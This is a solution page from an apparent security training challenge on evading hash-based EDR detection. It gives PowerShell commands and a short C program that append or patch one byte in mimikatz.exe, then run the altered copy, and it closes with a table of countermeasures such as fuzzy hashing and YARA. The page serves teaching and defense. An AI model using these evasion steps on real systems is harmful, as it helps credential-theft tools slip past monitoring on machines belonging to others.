---
title: "Solution 29: Single-Byte Hash Evasion"
difficulty: easy
category: "Signature Bypass"
---

[Back to Challenge]({{ '/challenges/29-single-byte-patch/' | relative_url }})

## Overview

SHA256 is a cryptographic hash — changing even a single bit produces an entirely different digest. The EDR's exact-match comparison fails immediately.

## Solution

```powershell
# Method 1: Append a null byte
copy mimikatz.exe mimikatz_mod.exe
cmd /c "echo. >> mimikatz_mod.exe"
.\mimikatz_mod.exe

# Method 2: Append random junk data
copy mimikatz.exe mimikatz_mod.exe
fsutil file seteof mimikatz_mod.exe (Get-Item mimikatz.exe).Length+1
.\mimikatz_mod.exe

# Method 3: Patch a padding byte with a hex editor
# Find any null-padded section alignment gap and change 0x00 to 0x01
```

```c
// Method 4: Programmatic — append 1 byte to any PE
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
    if (argc < 2) return 1;

    FILE* f = fopen(argv[1], "ab");
    if (!f) return 1;

    char junk = 0x42;
    fwrite(&junk, 1, 1, f);
    fclose(f);

    printf("Appended 1 byte to %s — SHA256 changed\n", argv[1]);
    return 0;
}
```

## Why It Works

SHA256 is designed so that any input change — even a single bit — produces a completely different 256-bit output (avalanche effect). The EDR compares hashes with exact string matching (`if imgHash in gSignatureHashes`), so any modification evades detection.

The binary still runs because:
- The PE loader ignores trailing data beyond the last section
- Padding bytes in section alignment gaps don't affect execution
- PE resources can be modified without changing program behavior

## Countermeasures

| Defense | What It Does |
|---------|-------------|
| Fuzzy hashing (ssdeep) | Detects files with small modifications |
| Section hashing | Hashes only executable sections, ignoring padding |
| Import hash (imphash) | Hashes the import table — survives byte patching |
| YARA rules | Pattern-matches on code sequences, not file hashes |
